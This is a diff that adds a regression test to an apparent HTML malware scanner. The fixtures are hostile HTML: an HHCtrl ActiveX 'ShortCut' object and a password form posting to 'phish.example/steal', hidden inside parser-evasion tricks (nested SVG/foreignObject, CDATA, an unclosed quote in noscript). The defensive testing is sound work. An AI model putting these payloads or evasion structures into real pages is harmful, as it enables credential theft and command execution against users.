@@ -748,3 +748,43 @@ def test_review_r8_regressions_lt_in_tag_endtag_bogus_and_foreign_cdata(
         assert "HTML_META_REFRESH_SUSPICIOUS" in _rule_ids(
             _scan(tmp_path, f"r8_meta_{idx}.html", b"<!DOCTYPE html><html><head>" + prefix + meta_tail)
         ), f"META missed for prefix {idx}"
+
+
+def test_review_r9_regressions_ns_stack_noscript_and_nested_object(
+    tmp_path: Path,
+) -> None:
+    chm = (
+        b'<object classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11">'
+        b'<param name="Command" value="ShortCut"></object>'
+    )
+    cred = b'<form action="https://phish.example/steal"><input type="password"></form>'
+
+    # Blocker 1: nested <svg><foreignObject><svg>..., bare <foreignObject><svg><script/>,
+    # nested foreign CDATA, and SVG HTML integration points (<title>/<desc>)
+    cases = (
+        b"<!DOCTYPE html><svg><foreignObject><svg><title/></svg></foreignObject></svg>" + chm,
+        b"<!DOCTYPE html><svg><foreignObject><svg><style/></svg></foreignObject></svg>" + chm,
+        b"<!DOCTYPE html><svg><foreignObject><svg><script/></svg></foreignObject></svg>" + chm,
+        b"<!DOCTYPE html><foreignObject><svg><script/></svg>" + chm,
+        b'<!DOCTYPE html><svg><foreignObject><svg><![CDATA[ ><x a=" ]]></svg></foreignObject></svg>'
+        + chm
+        + b'<!--"-->',
+        b'<!DOCTYPE html><svg><title><textarea/><x a="</textarea>' + chm + b'<!--"--></title></svg>',
+        b'<!DOCTYPE html><svg><desc><textarea/><x a="</textarea>' + chm + b'<!--"--></desc></svg>',
+    )
+    for idx, doc in enumerate(cases):
+        assert "HTML_CHM_ACTIVEX" in _rule_ids(_scan(tmp_path, f"r9_ns_{idx}.html", doc)), f"case {idx}"
+
+    # Blocker 2: <noscript> RAWTEXT with unclosed quote
+    ns_chm = b'<!DOCTYPE html><html><body><noscript><x a="</noscript>' + chm + b'<!--"--></body></html>'
+    ns_cred = b'<!DOCTYPE html><html><body><noscript><x a="</noscript>' + cred + b'<!--"--></body></html>'
+    assert "HTML_CHM_ACTIVEX" in _rule_ids(_scan(tmp_path, "r9_noscript_chm.html", ns_chm))
+    assert "HTML_CREDENTIAL_FORM" in _rule_ids(_scan(tmp_path, "r9_noscript_cred.html", ns_cred))
+
+    # Major 3: nested benign <object></object> inside hhctrl <object>
+    nested_obj = (
+        b'<!DOCTYPE html><html><body>'
+        b'<object classid="clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11">'
+        b'<object></object><param name="Command" value="ShortCut"></object></body></html>'
+    )
+    assert "HTML_CHM_ACTIVEX" in _rule_ids(_scan(tmp_path, "r9_nested_obj.html", nested_obj))
